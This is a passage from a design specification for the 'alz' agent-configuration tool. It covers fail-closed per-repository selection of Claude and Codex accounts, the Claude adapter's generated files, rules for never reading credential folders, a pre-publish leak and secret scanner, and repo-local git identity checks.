  (`getpwuid_r` of `geteuid()`, as Node's `os.homedir()` does). When the database has no entry
  for that id, alz acts as for a `HOME` that is not an absolute path. The TypeScript `alz`
  crashes in that case (reference drift, TASK-72).
- **A named account that cannot apply fails closed** (resolver and `alz account which` built,
  TASK-50.10; `alz run`, TASK-50.3; `alz use` and the hook, TASK-50.6; decision-16). A named account cannot apply when its folder does not exist, explicit (steps
  1 and 2) or implicit (steps 3 and 4), or when, in an allowed repository, step 4 is skipped
  because of a cache miss, a changed declaration, or a recorded source that is no longer in
  the stack. Then alz never uses the default account, and never a newly declared account:
  - `alz run` and `alz use` fail before anything starts, exit non-zero and name the fix. For
    a missing folder they list the account folders that exist by name only; on a cache miss
    they say to run `alz build`; on a changed declaration or source, `alz account allow`.
  - The shell hook warns and always sets the variable of each target that the recorded entry
    or the declaration names:
    - to the chosen account's folder when that folder is missing;
    - to the recorded account's folder on a cache miss while the recorded source is still
      in the stack; when the recorded account is `default` (or the configured `default_name`)
      the variable is unset, because the approved account is the default account;
    - to the blocked folder, `~/.claude-alz-blocked` or `~/.codex-alz-blocked`, when the
      declaration changed or is gone, the recorded source is no longer in the stack, several
      client layers declare (a conflict), or the repository's `layer.yaml` cannot be read.

    Whether an account folder exists is decided from one listing of `$HOME` (§9.1): a
    directory or a link named `.claude-<name>` or `.codex-<name>` exists, nothing in it is
    opened, and `alz-blocked` never counts as existing.

    alz never creates the blocked folders, and `alz account init` refuses the name
    `alz-blocked`. A tool whose variable names a folder that does not exist behaves as
    follows (§12 item 18), and both count as failing closed (owner decision 8 in TASK-50.1):
    - Claude creates the folder with mode `0755` (the umask default, not the `0700` that
      `alz account init` uses) and starts logged out; an interactive start offers to log in.
      So `~/.claude-alz-blocked`, or a missing named folder, comes into existence at the
      first such Claude start, and a login there would make it usable.
    - Codex refuses to start (`CODEX_HOME points to … but that path does not exist`) and
      creates nothing.

    `alz doctor` does not count the blocked folders as accounts, but warns when one exists
    (TASK-50.4), so the person can delete it; given the behaviour above, only
    `~/.claude-alz-blocked` is expected to appear.
  - `alz account which` reports `layer step skipped (<reason>); fails closed`, what the hook
    applies (the missing folder, the recorded account or the blocked folder), and the fix
    command. The fix is `alz account init <name>` for a missing folder (with the account
    folders that exist, by name), `alz build` for a cache miss, `alz account allow` for a
    changed declaration or source, `alz account allow --remove` when the layers no longer
    declare an account, removing one declaration and then `alz build` for a conflict, and
    repairing `<root>/layer.yaml` for a manifest that cannot be read. A named account whose
    folder is missing is reported as `<step> step names <name>, but <folder> does not exist;
    fails closed`; for the reserved name `alz-blocked` the fix says the name is reserved instead of naming `alz account init`. A target that the allowed entry does not name is skipped without failing.

  This amends decision-15's "falls back to the default account" (decision-16).
- **Values set outside alz** (resolver and `alz account which` built, TASK-50.10; the hook that
  exports the markers, TASK-50.6; `alz run`, TASK-50.3; decision-17). The shell hook
  exports, next to each variable it sets, a marker that holds the exact value it set:
  `ALZ_SET_CLAUDE_CONFIG_DIR` and `ALZ_SET_CODEX_HOME`. A current value that differs from its
  marker, or that has none, is foreign: alz leaves it alone and warns once that it was
  `set outside alz`, and it takes the place of steps 3 to 5. An explicit `--account` (steps 1
  and 2) replaces it. The marker also gives `alz account which` its `environment` source. A
  variable that is set but empty is foreign (without a marker that holds the empty text); an
  unset variable never is, and a marker without its variable is stale and ignored.
  - When `__MISE_DIFF` or `DIRENV_DIFF` exists, the warning adds `mise or direnv is active
    here`. alz checks only that these variables exist. It never reads, decodes, prints or
    logs their values: each holds every variable mise or direnv set, with its value, secrets
    included, and neither encoding is a stable interface (§12 item 20).
  - **Limit.** Claude applies `env.CLAUDE_CONFIG_DIR` from user settings (the chosen
    folder's own `settings.json`), from `--settings` and from managed settings over the value
    alz set, at least for the session's subprocesses (§12 items 10 and 15). alz never reads
    those files, so it can neither see this nor warn about it. Project and local settings
    cannot set the variable, because Claude drops it there, so for Claude the rule that
    layers cannot set it (§7.9) is defence in depth.
  - **Limit.** A Codex `shell_environment_policy` that alz did not generate, in a hand-written
    project `.codex/config.toml` or in the account's own `config.toml`, can change or drop the
    variables for Codex's shell commands (§12 item 15). alz never reads those files, so this
    is outside its control.
- **What a session passes on** (tool facts, no alz behaviour; §12 item 15). Claude's hooks,
  its Bash tool and its stdio MCP servers inherit `CLAUDE_CONFIG_DIR`, unless
  `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1` removes it from all three or
  `CLAUDE_CODE_MCP_ALLOWLIST_ENV=1` gives MCP servers only a baseline environment. Codex's
  hooks inherit `CODEX_HOME` from the environment the session started with, and its shell
  commands get it through `shell_environment_policy` (by default the whole environment).
  Codex's stdio MCP servers do not inherit `CODEX_HOME` or `CLAUDE_CONFIG_DIR` unless the
  server's `env_vars` lists them, so an MCP server that runs `codex` or `claude` uses the
  default account. The same holds for a Codex shell command whose policy leaves the
  variables out (`include_only`, or an `inherit` other than `all`).
- **`alz use` stays in the shell** (the argument is built, TASK-50.10; `alz use`, TASK-50.6).
  `alz use` keeps its choice in unexported shell variables held by the `alz` shell function,
  which passes the choice to `alz run` as `--account`, and to the hook's resolution and to
  `alz account which` as `--use <target>=<name>` (repeatable, once per target); that is the
  `use` source. An unknown target, an invalid name, a target named twice or a positional
  argument is a usage error. An exported `ALZ_USE_<TARGET>` or any other environment variable is
  never read as an `alz use` choice, so a forged one changes nothing.
- **Shell hook** (TASK-50.6). `alz run` (TASK-50.3) starts one tool with the variable set and
  needs no hook. A Node CLI cannot change its parent shell's environment, so, as with mise,
  `alz use` and switching by folder need the hook from `eval "$(alz activate zsh)"` (or
  `bash`). The hook defines the `alz` shell function that `alz use` needs, and runs when it
  is loaded and at each prompt where the working directory changed. It then sets each
  target's variable and marker to the resolved account, or unsets them where the default
  account applies. Only `alz use` changes a foreign value. Because the output is evaluated:
  - the output contains only lines `export NAME='value'` and `unset NAME`, for the account
    variables and the `ALZ_SET_*` markers;
  - each value is built from `$HOME` and a validated account name, never from other text,
    and is single-quoted with every `'` written as `'\''`;
  - every message goes to standard error, sanitised as in §9.4 (home shown as `~`, control
    characters removed);
  - the activate script quotes every expansion.
- **Shared and per-account items** (TASK-50.5; decision-17, which amends decision-16's
  "init shares config only"). `alz account init <name>` shares nothing by default: it creates
  the named account folders with mode `0700` and makes no link, so each account starts with
  its own user-level configuration. Personal agents and skills still reach every alz
  repository through `alz build` at project scope, the same in every account (§8.4). The user
  can share an item on purpose with `--share <item>`, which links the account's item to the
  default account folder's copy and prints a warning that names the item's limits (below).
  `--share` accepts only the items in the table's middle column, written without the slash
  (`agents`, `commands`, `CLAUDE.md`, `skills`, `plugins`, `settings.json`, `projects`,
  `AGENTS.md`, `sessions`, `memories`; `skills` applies to both targets), and rejects anything
  else before planning. Both tools read linked items and write through the links
  (§12 item 14):

  | Target | Per account; shared only with `--share` | Always per account, never linked |
  |---|---|---|
  | `claude` | `agents/`, `commands/`, `CLAUDE.md`, `skills/` and `plugins/` (entry by entry, below), `settings.json`, `projects/` | logins and MCP OAuth logins (the Keychain entry keyed to the folder, or `.credentials.json`); `.claude.json` (workspace trust, per-project state, user MCP servers); `synced/` and `.trash/` inside `skills/` and `plugins/`; prompt history; file checkpoints |
  | `codex` | `AGENTS.md`, `skills/`, `sessions/`, `memories/` | logins (`auth.json`, or a keyring entry keyed to the folder); `config.toml` |

  Limits of opting in (`docs/target-facts.md` §12.1):
  - Claude `skills/` and `plugins/` are linked entry by entry. `--share skills` or
    `--share plugins` creates a real `skills/` or `plugins/` folder (mode `0700`) in the
    account and links each entry of the default copy except `synced` and `.trash`, where
    claude.ai's sync writes each account's organisation items. A whole-folder link would put
    every account's synced items in one folder, where the other accounts load them and each
    sync removes the others' (change C4). An entry that already exists in the account is left
    alone and listed, never moved aside, because a backup inside `skills/` would load as a
    skill. Entries added to the default copy later are linked by running the command again.
    Per-entry links load for skills (SMOKE). For `plugins/`, whose entries are files that
    Claude rewrites (`installed_plugins.json`, `known_marketplaces.json`), they are not
    verified yet; TASK-50.5 records that fact before it builds `--share plugins`.
  - With `plugins` shared, Claude records each plugin's install path under the folder of the
    account that installed it (change C10), so deleting that account folder can break the
    plugin for the other accounts. Install plugins from the default account.
  - Codex rewrites `skills/.system/` at start with the skills of its own version. With
    `skills` shared it writes through the link into the shared folder, so accounts started
    with different Codex versions rewrite it at each switch (change C5).
  - `settings.json` carries the keys that carry or pin a login (`apiKeyHelper`, `env` tokens,
    `forceLoginMethod`, `forceLoginOrgUUID` and others; §12 item 16), so sharing it shares
    them.
  - Whether Codex keeps a linked `sessions/` or `memories/` or replaces it needs a login to
    observe (owner check O7). Claude's `projects/` was not tested as a link; TASK-50.5
    records that fact before it builds `--share projects`.

- **`alz account init` safety** (TASK-50.5).
  - It refuses the names `default` and `alz-blocked` (the blocked folders, above) and the
    configured `default_name`.
  - It uses `lstat` throughout. It refuses when an account folder, or the parent of a shared
    item (the account folder, or the account's `skills/` or `plugins/` for an entry), is a
    symbolic link, or when an account folder's real path is the default folder.
  - It plans every step before it acts, and changes nothing when the plan has any problem.
    `--dry-run` prints the plan and stops.
  - It creates folders with mode `0700`. It links only items named with `--share`, and only
    those that exist in the default folder.
  - It moves an existing whole item aside only by renaming it in the same folder to
    `<item>.alz-backup-<UTC timestamp>` (for example `agents.alz-backup-20261122T101500Z`),
    never by copying and never over an existing backup. A backup name never matches
    `.claude-*` or `.codex-*`, so account discovery (§8.4) never takes a backup for an
    account folder. Entries of Claude's `skills/` and `plugins/` are never moved aside
    (above).
  - Running it again with the same arguments changes nothing, unless the default copy of a
    shared `skills/` or `plugins/` gained an entry, which it then links.
- **Trust is per account** (TASK-50.4). Workspace trust lives in per-account state, which alz
  never opens, so alz never determines whether a repository is trusted. Claude keeps it in the
  folder's `.claude.json`, keyed on the repository root (the main checkout for a worktree);
  Codex keeps it in the folder's `config.toml` (§12 items 10 and 11). `alz doctor` prints a
  static notice that trust is per account, so a repository trusted on one account needs
  accepting again on another.
- **Logins kept outside the account folder** (tool facts; §12 items 12 and 17).
  - **Limit.** For Claude, account selection separates only the logins Claude keeps per
    folder: `/login` credentials and MCP OAuth logins, in the Keychain entry keyed to the
    folder or in `.credentials.json`. Anthropic profiles in `~/.config/anthropic` (with
    `ANTHROPIC_PROFILE`), Console sign-ins without an API key, credentials in environment
    variables (`ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `CLAUDE_CODE_OAUTH_TOKEN`) and
    cloud-provider credentials are shared by every folder, and several of them take
    precedence over `/login` (change C3).
  - **Known limit: Codex MCP logins** (the owner has deferred this decision). In Codex's
    default credential mode, MCP OAuth logins are stored in the OS keyring, when one is
    available, under the server's name, URL and headers, not under the account folder, so
    every `CODEX_HOME` on the machine shares one login per server. Account selection does not separate them
    (`docs/target-facts.md` §12 item 17, change C2; read from source, owner check O3).
- **No generated output** (built, TASK-50.10). The build writes no account value into any generated
  file or the lock and sets no variable, so the output stays byte-identical whatever account
  is chosen.
- **Layer format.** `account` is a new `layer.yaml` field. Unknown fields are a schema error
  (§5.1), so a layer that declares it needs the minor release that ships TASK-50.2, and §5.1
  lists the field from that release on. The new build error for layers that set the account
  variables (§7.9) can fail a build that passes today, so it needs a release note too. The
  user config, the allow state and the commands in §10 are new user-facing surface;
  generated output does not change, and the cache index lives in the cache.

---

## 8. Target adapters

Each adapter maps the resolved neutral model onto native files. Adapters are plugins of the
tool (one module each), so new targets need no core changes.

**What an adapter may rely on** (TASK-55.6). An adapter relies only on what
`docs/target-facts.md` records about the tool, and adds no output that rests on a fact that is
UNVERIFIED there. The Rust `alz` writes, for the Claude adapter, exactly what the TypeScript
`alz` writes, and that includes output that rests on a row still marked UNVERIFIED. Each such
row gets a docs task that verifies it, and no new output is added on it until it is verified.
Today those rows are:
- relative paths in `permissions.additionalDirectories` (target-facts §7c);
- how Claude treats a settings key it does not know (target-facts §7).

The three permission floor keys (§7.6) are written once target-facts records them (TASK-76).

Only the Claude adapter exists. A manifest whose `targets` holds `codex` is the error `target` at
`layer.yaml`, with the message `the 'codex' adapter is not implemented yet (implemented:
claude)`. Any other name is a manifest error (§5.2). Codex output is TASK-18.

### 8.1 `claude` adapter
| Neutral item | Output |
|---|---|
| Instructions | `CLAUDE.md` = `@AGENTS.md` + Claude-only block |
| Agents | `.claude/agents/<name>.md` (map neutral tools/skills/model/isolation/memory to native frontmatter) |
| Skills / commands | `.claude/skills/<name>/` |
| Hooks | `.claude/settings.json` → `hooks`, scripts in `.claude/hooks/` |
| Permissions | `.claude/settings.json` → `permissions` |
| MCP | `.mcp.json` (only enabled ids) |
| Models | resolved into agent frontmatter; default in `settings.json` |

What the adapter writes for each item (TASK-55.6). Every YAML part is written by §10.2's
emitter and every JSON file by the stable JSON emitter, with keys in name order (§6). The
target-facts section each item relies on is given in brackets.
- **`CLAUDE.md`** [§3]: the header with `AGENTS.md` and each `CLAUDE.extra.md` as sources, a blank
  line, `@AGENTS.md`, and, when a layer has a `targets/claude/CLAUDE.extra.md`, a blank line,
  `## Claude-specific` and each extra text in stack order, separated by blank lines. The file ends
  with one line feed.
- **Agents** [§1]: an agent whose `targets` is absent or holds `claude`
  becomes `.claude/agents/<name>.md`. Its frontmatter has `name`, then `description`, then:
  - `tools`, the native names joined with `, ` without duplicates. A scope is dropped with the
    warning `tool-scope`, because Claude cannot scope a tool per agent. An empty list is the
    error `claude-agent`, because Claude reads it as all tools.
  - `model`, resolved through the routing (§7.8). A value that is not a Claude model value is the
    error `claude-agent`. Claude model values are `sonnet`, `opus`, `haiku`, `fable`, `inherit`
    and `claude-` followed by lower-case letters, digits, `.` or `-`.
  - `permissionMode`, `skills` when not empty, `isolation` only for `worktree`, and `memory`
    unless it is `none`, since Claude has no `none` for these.
  - The native fields of `claude:`, in the order §7.2 gives them. A native value is written by
    §10.2's emitter, which writes no null, no float and no integer beyond 64 bits. The types of
    §7.2 already refuse a null or a float in a typed field (code `agent`, at read), so only a
    whole number beyond 64 bits reaches the emitter: an agent whose native field holds one is the
    error `claude-agent`, naming the field and the agent's file. The TypeScript `alz` writes it
    (reference drift, TASK-55.6.4).

  The model is resolved as §7.8 says. A `model` that is not an alias of `models.yaml` is the
  error `models`, and an alias with no `claude` model is the warning `models`; the agent then
  has no `model` field. Both name the agent and its file.

  The header is a comment line right after the opening `---`, and the body follows the closing
  `---` after a blank line.
- **Tools** [§1]: `read` Read, `write` Write, `edit` Edit, `grep` Grep, `glob` Glob, `bash` Bash,
  `web_fetch` WebFetch, `web_search` WebSearch, `agent` Agent, `notebook_edit` NotebookEdit,
  `todo_write` TodoWrite, `skill` Skill. An `mcp__` tool keeps its name. A permission or hook rule
  `<tool>:<pattern>` becomes `<Tool>(<pattern>)`, and a bare `<tool>` becomes `<Tool>` [§7b].
- **Modes** [§1]: `bypass_permissions` bypassPermissions, `auto` auto, `accept_edits`
  acceptEdits, `default` default, `dont_ask` dontAsk, `plan` plan.
- **Skills** [§5]: every file of the winning skill folder, at `.claude/skills/<name>/`, byte for
  byte with its executable bit, except that `SKILL.md` gets the header comment as the first line
  of its frontmatter. The sources are the definitions not overridden.
- **Commands** [§5]: `.claude/skills/<name>/SKILL.md` with `name`, `description`,
  `argument-hint` when set, and `disable-model-invocation: true`, then the body.
- **Slot stubs** (§7.3): `.claude/skills/<name>/SKILL.md` with the description `Slot stub:
  <name> is not defined for this repo` and the body ``The `<name>` skill is not defined for this
  repo. Do not assume its conventions; ask the user when they matter.``
- **Rules** [§7c]: `.claude/rules/<name>.md` with `paths:` in the frontmatter, the header and the
  body.
- **`.claude/settings.json`** [§4, §7b, §7c]: written when it would not be empty. It holds the
  claude settings of `settings.yaml` (§7.9), and the generated keys merged into them:
  - `permissions.allow`, `ask` and `deny` as Claude rules, and `permissions.defaultMode`;
  - `permissions.additionalDirectories`: `workspace.hub` first, then `workspace.add_dirs`, as
    written and without duplicates;
  - the floor fields of §7.6, once target-facts records them, as
    `permissions.disableBypassPermissionsMode`, `blockReadsOutsideWorkingDirectories` and
    `blockWritesOutsideWorkingDirectories`, each `true` when a layer set it;
  - `hooks`: per native event, one group per hook in stack and file order. Neutral events map to
    SessionStart, PreToolUse, PostToolUse, Stop, SubagentStop and UserPromptSubmit. A group has
    `hooks`, one handler per tool and path pair (`if: <Tool>(<path>)`), or one handler without
    `if`, and a `matcher`, the hook's own or its tools joined with `|`. A handler has
    `type: command`, `command`, and `timeout` and `onFailure` when set. `on_fail: deny` gives
    `onFailure: block`; on `stop` and `subagent_stop` it gives nothing and the warning
    `hook-on-fail`, and on `post_tool` it gives `block` and the warning `hook-on-fail`, because a
    post-tool hook cannot block. A `run:` script is copied once to
    `.claude/hooks/<layer>/<path inside hooks/>` with its executable bit, and the command is
    `"${CLAUDE_PROJECT_DIR}/<that path>"`. A `command:` is written with each `${PROJECT_DIR}`
    (§7.5) replaced by `${CLAUDE_PROJECT_DIR}`;
  - `model`: the Claude model of the default alias (§7.8).

  `settings.yaml` cannot set any of these keys (§7.9).
- **`.mcp.json`** [§7]: written when a server is enabled.
  `mcpServers` maps each enabled id to its definition: `command` and `args`, plus `env` mapping
  each `env_from` name to `${NAME}`, for `stdio`; or `type` (`http` or `sse`) and `url`. `type` is
  always written for a URL, because an entry with a URL and no type is read as stdio.
- **Passthrough** (§7.11): each file of `targets/claude/<path>` at `<path>`, byte for byte with
  its executable bit.
- **Protected folders** [§7c]: `.claude/agent-memory/**` and `.claude/agent-memory-local/**`,
  added to §4.5's list.
- **Managed folders**: `.claude/agents`, `.claude/skills`, `.claude/rules` and `.claude/hooks`
  (§4.3).
- **Adopted always**: `.claude/settings.json` and `.mcp.json` (§4.3).
- **Verified range**: Claude Code `>=2.1.311 <2.2.0`, which `alz doctor` checks.

### 8.2 `codex` adapter
| Neutral item | Output |
|---|---|
| Instructions | `AGENTS.md` (shared with all targets) |
| Agents | `.codex/agents/<name>.toml` (instructions point to a generated body file) |
| Skills / commands | `.agents/skills/<name>/` |
| Hooks | `.codex/config.toml` / hooks config where supported; otherwise a warning |
| Permissions | sandbox / approval settings in `.codex/config.toml` (best-effort mapping; anything that can't be mapped becomes a warning) |
| MCP | `.codex/config.toml` → MCP servers (only enabled ids) |
| Models | per-agent and default model in `.codex/config.toml` |

### 8.3 Committing generated output
- Default `commit_generated: true`. Generated files are committed so CI, cloud agents,
  collaborators and other accounts all see the same setup, and so changes appear in PRs.
- With `false`, generated paths are added to `.gitignore` and `alz build` must run in
  CI and on checkout (via a mise hook or task).

### 8.4 Account independence (key rule)
The build writes **only to project scope**. User-level dirs (`~/.claude`, `~/.codex`, and
every per-account variant such as `~/.claude-<client>`) should hold **no agents or skills**
that might collide by name. Check: `alz doctor` scans every configured account dir and
reports collisions with the built names. The result is that switching accounts never
changes agent behaviour.

Account selection (§7.13, planned) builds on this rule: because the build output does not
depend on the account, alz can choose each repository's account folder without changing what
its agents see. So `alz account init` shares nothing by default (decision-17): personal
agents and skills reach each repository through the build, at project scope, whichever
account is active, and every account folder keeps its own user-level configuration. A user
who wants a user-level item to be the same in several account folders links it on purpose
with `--share <item>` (§7.13 "Shared and per-account items").

---

## 9. Safety rules

### 9.1 Never touch
Credentials, auth/token files, `.env*` contents, account config dirs and anything outside the
repo and the layer cache.

**Account folders are touched by name only.** `~/.claude`, `~/.claude.json`, `~/.codex` and
every `~/.claude-*` and `~/.codex-*` are read by `alz doctor` and, once built, by account
selection (§7.13). The only read operations allowed there are:
- listing `$HOME` for names that start with `.claude-` or `.codex-`;
- `lstat` and `readlink` of the fixed shared-item names (§7.13) and of the entries of
  `skills/` and `plugins/`;
- listing `agents/`, `commands/`, `skills/` and `plugins/` for the names they hold.

alz never opens or reads any other file there, so it never learns a login or whether a
repository is trusted (§7.13 "Trust is per account"). The only writes there are the planned
ones of `alz account init`, listed below.

**Writes outside the repo and the cache** (§7.13), each made only by an explicit command,
never by `build`, `check`, `alz run` or the shell hook:
- Built (TASK-50.11): `alz account allow` and `alz account allow --remove` write
  `${XDG_STATE_HOME:-~/.local/state}/agent-layerz/allowed.yaml`, with its lock file
  `allowed.yaml.lock` and a temporary file `.allowed.yaml.<pid>-<8 hex>.tmp` (both named after the real file for a link), only through
  `src/resolve/account-allow-writer.ts`: under an exclusive lock file next to the file that is
  replaced, through the temporary file in the same directory and a rename, with mode `0600` in
  a directory with mode `0700` (§7.13 "Both files" has the rest). Nothing else outside the
  repository is written by them. The file is never inside the repository, an account folder or
  a git work tree or, for a linked `allowed.yaml`, the directory of its real path, which passes
  the same checks; missing parent folders are created with mode `0700`.
- Planned: `alz account init <name>` creates the account folders for `<name>` with mode `0700`
  (TASK-50.5). Only for the items named with `--share` does it create a link, create the
  real `skills/` or `plugins/` folder that holds per-entry links, or move a whole item it
  replaces aside by renaming it in the same folder. It has a `--dry-run` that changes
  nothing, and it never copies a file.

alz also reads the hand-written user config
`${XDG_CONFIG_HOME:-~/.config}/agent-layerz/accounts.yaml`, which it never writes. Neither
command opens a file inside an account folder or touches a login. The cache index that
the commands resolving the stack write for pinned `path:` layers (§7.13 "No fetch on
resolve") lives in the layer cache, so it is no exception.

A path *touches an account folder* when it is `$HOME` or above it, lies inside an account
folder, or contains one, a folder that `CLAUDE_CONFIG_DIR` or `CODEX_HOME` names included.
Names are compared one component at a time after Unicode NFC normalisation and lowercasing, so
a case or form variant of `~/.claude-x` counts (TASK-52). The real path that a link named like an
account folder in `$HOME` leads to is an account folder too (§6 "Layers in or around an account
folder").
- Account resolution treats a repository root, cache or layer directory that touches an
  account folder as a cache miss, and opens nothing in it.
- Every command that resolves the stack refuses such a layer directory or cache root (§6 "The
  layer cache" and "Layers in or around an account folder").

Both find real paths one component at a time, and check each resolved prefix before they look
at the next one. So no name inside an account folder is looked at, even through a link
(decision-27).

### 9.2 Leak guard
For layers with `visibility: public`:
- Before `alz publish` or a commit on the layer repo, scan every file against the layer's
  `forbid_patterns`, a built-in secret scanner (gitleaks or equivalent) and a heuristic for
  private hostnames and emails.
- A public layer that `extends` a private one is an error (§3.1).

**`forbid_patterns`.** Each entry is a regular expression. It is matched against the text of
every file of the layer, the layer's `layer.yaml` without its `forbid_patterns` field included.
A match is an error (code `leak-forbid`) that names the file and the entry by its number (`#1` is
the first), never the matched text. The syntax is that of Rust's `regex-lite` crate
(decision-38):
- flags are written inline, such as a leading `(?i)` for case-insensitive matching;
- `\d`, `\s`, `\w` and `\b` are ASCII only (`\w` is `[0-9A-Za-z_]`), and case-insensitive
  matching folds ASCII letters only;
- `\p{…}` classes, look-around (`(?=`, `(?!`, `(?<=`, `(?<!`) and backreferences (`\1` to `\9`,
  `\k<name>`) are not supported.

An entry is refused with code `leak-forbid` and its number when it:
- uses look-around or a backreference (the message names the feature);
- does not compile;
- is longer than 512 characters;
- compiles to more than 64 KiB or nests more than 32 levels.

A layer has at most 64 entries. These limits bound the work that an untrusted pattern can cause.
The TypeScript `alz` compiles the entries as JavaScript regular expressions, without these
limits. So a pattern that relies on look-around, backreferences, `\p{…}` or non-ASCII case
folding passes there and is refused by the Rust `alz` (reference drift, TASK-55.5).

**Secret scan.** The built-in scanner looks for fixed token shapes:
- GitHub, Anthropic, OpenAI-style, AWS, Google, Slack and Stripe keys;
- private key blocks;
- a long value assigned to a key named like `api_key`, `secret`, `token` or `password`.

A finding is an error (code `leak-secret`) that names the file and the kind of token, never the
text. In a public layer every file is scanned. In every layer, the definitions of `mcp.yaml` are
scanned (§7.7). Two heuristics give warnings for public layers: `leak-email` for an email address
and `leak-host` for a private host name (ending in `.internal`, `.corp`, `.lan`, `.intranet` or
`.local`).

**How the guard reports** (TASK-55.5.14).
- One diagnostic per file and kind of finding, without a line number:
  - per file and `forbid_patterns` entry;
  - per file and kind of secret;
  - one `leak-email` and one `leak-host` warning per file.

  The TypeScript `alz` reported each line (reference drift).
- Patterns are matched against the whole text of the file in multi-line mode: `^` and `$` match
  at the start and end of each line, and a line ends at LF, CR or CR LF.
- Every file is turned into text before any check:
  - A file that starts with a UTF-16 byte order mark, little- or big-endian, is decoded as
    UTF-16.
  - Any other file is read as UTF-8, with invalid bytes replaced by U+FFFD.
  - The byte order mark is not part of the text, and every NUL is removed.

  So binary, non-UTF-8 and UTF-16 files are scanned too. The TypeScript `alz` skipped a file with
  a NUL in its first 8 KiB, which includes most UTF-16 files (reference drift, TASK-55.5).
- Only the `forbid_patterns` match reads `layer.yaml` without the lines of its
  `forbid_patterns` field: from the line of its key up to the line before the next key, with the
  comment lines in that span kept. The secret scan and the email and host heuristics read the
  whole file (TASK-55.5).
- A refused entry is located at `<layer>:layer.yaml`.
  - An entry that does not compile, compiles too large or nests too deep gets one message.
  - Past the 64-entry cap, only entry 65 is reported, for it and every later entry.
- The heuristics are the reference's patterns:
  - An email address matches `\b[A-Za-z0-9._%+-]+@(?:[A-Za-z0-9-]+\.)+[A-Za-z]{2,}\b`, except
    one at `example.com`, `example.org`, `example.net`, `users.noreply.github.com` or
    `anthropic.com`.
  - A private host matches `(?i)\b[a-z0-9-]+(?:\.[a-z0-9-]+)*\.(?:internal|corp|lan|intranet|local)\b`.
- The credential-assignment shape of the secret scan spells out JavaScript's white-space set.
  That keeps its matches equal to the reference's.

- A `commit_identity` (§7.12) in a public layer is public. Prefer a no-reply address (for
  GitHub, `<id>+<user>@users.noreply.github.com`); any other address raises the usual
  `leak-email` warning, and `forbid_patterns` apply to it like any other line.
- An `account` (§7.13, planned) in a public layer is public too: a public first layer that
  names a client's account publishes that client's name. Declare client accounts in the
  client layer; `forbid_patterns` apply to the field like any other line.

### 9.3 Security floor
Locked hooks (§7.5) and deny rules (§7.6) can't be removed by more specific layers. The
build fails, with a message naming the layer that tried.

Cached layers are checked too (§5.3, §6): a `tree2@` entry is compared with its git tree, and a
git entry with the lock's content hash or a fresh clone. This catches a cache entry edited after
it was written; it does not make the cache a trust anchor against someone who can change the
lock as well as the cache.

### 9.4 Repository git identity
With a declared `commit_identity` (§7.12):

- **Effective identity** is what git would use for a commit in the repo root:
  `git var GIT_AUTHOR_IDENT` and `git var GIT_COMMITTER_IDENT`. Name and email are compared
  exactly with the declaration. An error from `git var` (no identity and
  `user.useConfigOnly`) counts as a mismatch.
- **Source of a mismatch**, found in git's own order: the environment variables
  `GIT_AUTHOR_NAME`, `GIT_AUTHOR_EMAIL`, `GIT_COMMITTER_NAME`, `GIT_COMMITTER_EMAIL`; then the
  config keys `author.*` or `committer.*`, then `user.*`, each located with
  `git config --show-scope --show-origin --get <key>`; then the `EMAIL` variable; otherwise
  "not set, git guessed it from the host".
- **Reports never echo the wrong value** (name or email). They name the layer that declared
  the identity, the key, the scope
  (`system`, `global`, `local`, `worktree`, `command`, or `environment`) and the source file,
  with the home directory shown as `~` and control characters removed. They may show the
  declared value, e.g. in the fix command `git config --local user.email '<email>'`, but only
  when the value is made of Unicode letters, marks, digits, space and `. - _ @ +`, so that the
  command means the same in POSIX shells, fish and PowerShell. For any other value (an
  apostrophe, say) the report prints no command and says to set the key to the value declared
  by the layer, which `alz build --adopt` adds when the key is unset. An identity that comes
  from the command scope (`GIT_CONFIG_COUNT`, `GIT_CONFIG_PARAMETERS`) is fixed by unsetting
  those variables, and one from an environment variable by unsetting that variable. Findings
  are printed one line per distinct source key in a fixed order (name, then email; author,
  then committer), so the output of a given setup is always the same.
- **Writing.** Only `alz init` (repo kind) and `alz build --adopt`, the setup commands, write.
  Plain `alz build` reports a mismatch as a warning and still succeeds; `alz check` reports it
  as an error and fails unless `--skip-identity` is passed. Writes:
  - use `git config --file <repo>/.git/config <key> <value>`, with the path checked by
    `insideRoot`; never `--global` or `--system`, never `~/.gitconfig` or any file outside
    the repo;
  - happen only when the repo root is the top level of its work tree and `.git` is a real
    directory (not a symlink, and not a gitfile as in linked worktrees and submodules).
    Also `.git/config` must be absent or a regular file, not a symlink, whose real path is
    inside the repository. Otherwise nothing is written and the report prints the commands to
    run by hand, followed by the findings of the effective identity (layer, scope, file). When
    the repo root is not the top level of its work tree, those commands would write to the
    outer repository, so the report says to run `git init` here first, or to run alz from the
    repository's top level, and prints findings without fix commands;
  - add `user.name` or `user.email` only when `.git/config` has no value for that key. An
    equal value is left alone. A different value is **never replaced**: it is reported as
    above. `.git/config` is not a generated file, and adding a missing key overwrites nothing
    (§4.3). A wrong global or system value needs no change, because the local key wins;
  - are followed by a fresh read of the effective identity, since an `[include]` in the local
    config or an environment variable can still override it; any remaining mismatch is
    reported. Each key written is printed with the declared value and the declaring layer.
- **Outside a git repository** (git itself says so) nothing is read or written, and init, build
  and check print a note instead. If git is missing or fails for another reason (a broken
  config file), the identity cannot be checked: `alz check` fails with an error, `build` and
  `init` warn. A `git config --get` failure other than "not set" reports the source as unknown.
- Identity subprocesses run through the existing git helper (no shell, `GIT_TERMINAL_PROMPT=0`)
  without the inherited `GIT_DIR`, `GIT_WORK_TREE`, `GIT_COMMON_DIR`, `GIT_CONFIG` and
  `GIT_INDEX_FILE`, so the environment cannot point them at another repository or file.

---

## 10. CLI

Streams, diagnostics, exit codes and how untrusted text is printed: §10.1.

| Command | Does |
|---|---|
| `alz init [--stack <source>]… [--hub <dir>]` | Scaffold a repo manifest with these layers, then `.layer/`. `--hub` also adds the hub's `layer/`, pinned to its newest `layer-v*` tag. Then resolves the stack and, with a declared commit identity, sets the repo-local git identity (§9.4). A source that cannot be resolved yet only gets a note that `alz build --adopt` will do it. Any other problem with the stack or with a declaration (a schema error, a layer that may not declare `commit_identity` or `account`) is printed as a warning, nothing is written (a refused `account` declaration also stops `init` from setting the commit identity), and `init` still exits 0 because the scaffold succeeded; `alz build` fails on the same problem. `--kind layer` scaffolds a new layer. |
| `alz build [--adopt]` | Resolve, merge, render, write, update the lock. Warns when the effective git identity differs from the declared commit identity (§9.4). `--adopt` also adopts hand-written config (§4.3) and sets the repo-local git identity. |
